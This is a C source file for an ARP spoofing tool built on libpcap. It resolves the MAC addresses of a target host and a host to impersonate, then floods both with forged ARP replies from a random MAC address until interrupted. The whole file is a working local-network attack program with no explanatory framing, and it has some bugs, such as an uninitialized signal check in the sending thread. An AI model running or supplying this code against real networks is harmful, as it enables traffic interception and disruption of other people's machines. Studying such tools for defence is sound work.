#include <stdio.h>
#include <stdlib.h>
#include <net/if_arp.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <time.h>
#include <unistd.h>
#include <pcap/pcap.h>
#include <pthread.h>
#include <signal.h>
#include "arp-spoof.h"


int
generateRandomMacAddr(unsigned char* mac_addr)
{
    srand((unsigned int) time(NULL));

    for(int i = 0; i < ETH_ALEN; i++){
        mac_addr[i] = rand() % 256;
    }
    // Avoid multicast address
    mac_addr[0] &= 0xFE;
    printf("Random MAC Address: ");
    for (int i = 0; i < ETH_ALEN; ++i) {
        printf("%02x%s", mac_addr[i], (i == ETH_ALEN - 1) ? "\n" : ":"); // Print the MAC address in the usual format
    }
    return 0;
}

int
resolveMacAddr(char *interface, unsigned char *target_ip, unsigned char *random_mac, unsigned char *resolved_mac)
{
    pcap_t *handle = prepareConnection(interface);
    unsigned char source_ip[4];
    if(inet_pton(AF_INET, getIpFromInterface(interface),source_ip) == -1){
        printf("Error while converting impersonate IP");
        exit(EXIT_FAILURE);
    }

    // Broadcast mac
    unsigned char broadcast_mac[ETH_ALEN] =
                {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};

    Packet *packet = craftPacket(random_mac,
                                source_ip,
                                broadcast_mac,
                                target_ip,
                                ARPOP_REQUEST);


    // Send 5 ARP broadcast packet to "ensure" an answer from target
    for (int i=0; i<5; i++){
        if(sendArpPacket(handle, packet)  < 1 ){
            fprintf(stderr,"Error sending ARP packet when resolving mac addr");
            pcap_close(handle);
            exit(EXIT_FAILURE);
        }
    }

    if(receiveArpPacket(handle, resolved_mac) != 0){
        fprintf(stderr,"Error receiving ARP packet when resolving mac addr");
        pcap_close(handle);
        exit(EXIT_FAILURE);
    }


    free(packet);
    pcap_close(handle);
    return 0;
}


char*
getIpFromInterface(char* name)
{
    int sockfd;
    struct ifreq ifr;
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, name, IFNAMSIZ-1);
    if(ioctl(sockfd, SIOCGIFADDR, &ifr) == -1) {
        perror("ioctl error");
        exit(1);
    }
    close(sockfd);

    return inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);
}

Packet*
craftPacket(unsigned char *sender_mac, unsigned char* sender_ip, unsigned char *target_mac, unsigned char *target_ip, int ARPOP_CODE)    // Ethernet header
{
    struct ether_header ethernet_header;
    // Packet type ID field
    ethernet_header.ether_type = htons(ETHERTYPE_ARP);
    // set source mac addr
    memcpy(ethernet_header.ether_shost, sender_mac, ETH_ALEN);
    // set destination mac addr
    memcpy(ethernet_header.ether_dhost, target_mac, ETH_ALEN);

    // ARP header
    struct arphdr arp_header;
    // Format of hardware address
    arp_header.ar_hrd = htons(ARPHRD_ETHER);
    // Format of protocol address
    arp_header.ar_pro = htons(ETHERTYPE_IP);
    // Length of hardware address
    arp_header.ar_hln = ETH_ALEN;
    // Length of protocol address
    arp_header.ar_pln = 4;
    // ARP opcode
    arp_header.ar_op = htons(ARPOP_CODE);

    // ARP Body
    ArpBody *arp_body = calloc(1,sizeof(ArpBody));
    // set source mac addr
    memcpy(arp_body->ar_sha, sender_mac, ETH_ALEN);
    // set destination mac addr
    memcpy(arp_body->ar_tha, target_mac, ETH_ALEN);

    memcpy(arp_body->ar_sip, sender_ip, 4);
    memcpy(arp_body->ar_tip, target_ip, 4);

    ArpPacket *arp = calloc(1, sizeof(ArpPacket));
    memcpy(arp,&arp_header,sizeof(struct arphdr));
    memcpy(&arp->body,arp_body,sizeof(ArpBody));


    Packet *packet = calloc(1,sizeof(Packet));
    memcpy(packet,&ethernet_header,sizeof(struct ether_header));
    memcpy(&packet->arp,arp,sizeof(ArpPacket));

    return packet;
}

pcap_t*
prepareConnection(char* interface)
{
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle = pcap_open_live(interface, BUFSIZ, 0, 1000, errbuf);
    if (handle == NULL) {
        printf("Error opening device: %s\n", errbuf);
        exit(EXIT_FAILURE);
    }

    return handle;
}

int
sendArpPacket(pcap_t *handle, Packet *packet)
{
    int nbBytes;
    if ((nbBytes = pcap_inject(handle, (unsigned char*)packet, sizeof(*packet))) < 1) {
        printf("Error sending packet: %s\n", pcap_geterr(handle));
        pcap_close(handle);
        exit(EXIT_FAILURE);
    }

    return nbBytes;
}

int
receiveArpPacket(pcap_t *handle, uint8_t mac[ETH_ALEN])
{
    const u_char *receiv_packet;
    struct pcap_pkthdr header;
    receiv_packet = pcap_next(handle, &header);
    if (receiv_packet == NULL) {
        fprintf(stderr, "No packet received.\n");
        return 1;
    }

    // Extract the MAC address from the response packet
    struct ether_header *eth = (struct ether_header *) receiv_packet;
    memcpy(mac, &eth->ether_shost, ETH_ALEN);

    return 0;
}

void*
threadSendArpPacket(void* tArgs)
{
    threadArgs *myArg = (threadArgs*)tArgs;
    pcap_t *h = prepareConnection(myArg->interface);

    while(1){
        sendArpPacket(h,&myArg->p[0]);
        // Added nanosleep because too much ARP packet are sended without
        nanosleep((const struct timespec[]){{0, 50000L}}, NULL);
        sendArpPacket(h,&myArg->p[1]);
        // Check for a SIGINT signal
        int sig;
        if (sig == SIGINT) {
            // Exit the thread if a SIGINT signal is received
            break;
        }
    }
    pcap_close(h);
    pthread_exit(NULL);
}



int
main(int argc, char *argv[])
{
    AttackSettings settings = { 0 };

    if (argc != 4) {
        printf("Usage: %s <target_ip> <impersonate_ip> <interface>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    // Target IP
    printf("Target ip = %s\n", argv[1]);

    if(inet_pton(AF_INET,argv[1],settings.target_ip) == -1){
        printf("Error while converting target IP");
        exit(EXIT_FAILURE);
    }

    // Gateway IP
    if(inet_pton(AF_INET,argv[2],settings.impersonate_ip) == -1){
        printf("Error while converting impersonate IP");
        exit(EXIT_FAILURE);
    }

    // Interface
    settings.interface = calloc(1,strlen(argv[3])+1);
    if(settings.interface == NULL){
        printf("Failed to allocate memory for %s", settings.interface);
        exit(EXIT_FAILURE);
    }
    strncpy(settings.interface,argv[3],strlen(argv[3]));
    strcat(settings.interface,"\0");
    printf("Interface = %s\n", settings.interface);

    generateRandomMacAddr(settings.random_mac);

    printf("Resolving Target MAC Address ...\n");
    resolveMacAddr(settings.interface,
                   settings.target_ip,
                   settings.random_mac,
                   settings.target_mac);

    printf("Resolved Target MAC Address: ");
    for (int i = 0; i < ETH_ALEN; ++i) {
        printf("%02x%s", settings.target_mac[i], (i == ETH_ALEN - 1) ? "\n" : ":"); // Print the MAC address in the usual format
    }

    printf("\nResolving Impersonate MAC Address ...\n");
    resolveMacAddr(settings.interface,
                   settings.impersonate_ip,
                   settings.random_mac,
                   settings.impersonate_mac);

    printf("Resolved Impersonate MAC Address: ");
    for (int i = 0; i < ETH_ALEN; ++i) {
        printf("%02x%s", settings.impersonate_mac[i], (i == ETH_ALEN - 1) ? "\n" : ":"); // Print the MAC address in the usual format
    }

    // Spoofed packet for target_ip
    Packet *p2 = craftPacket(settings.random_mac,
                             settings.impersonate_ip,
                              settings.target_mac,
                              settings.target_ip,
                              ARPOP_REPLY);

    // Spoofed packet for impersonate_ip
    Packet *p3 = craftPacket(settings.random_mac,
                              settings.target_ip,
                              settings.impersonate_mac,
                              settings.impersonate_ip,
                              ARPOP_REPLY);

    threadArgs tArgs;
    pthread_t t1,t2;
    tArgs.interface = settings.interface;
    tArgs.p[0] = *p2;
    pthread_create(&t1, NULL,&threadSendArpPacket,&tArgs);

    tArgs.p[1] = *p3;
    pthread_create(&t2, NULL,&threadSendArpPacket,&tArgs);

    printf("Spoofing ...\n");

    // Wait for a SIGINT signal
    int sig;
    sigset_t sigset;
    sigemptyset(&sigset);
    sigaddset(&sigset, SIGINT);
    sigwait(&sigset, &sig);
    if (sig == SIGINT) {
        // Send a SIGINT signal to the thread
        pthread_kill(t1, SIGINT);
        pthread_kill(t2, SIGINT);

        // Wait for the thread to exit
        pthread_join(t1, NULL);
        pthread_join(t2, NULL);
        free(p2);
        free(p3);
        free(settings.interface);

    }


    return EXIT_SUCCESS;
}


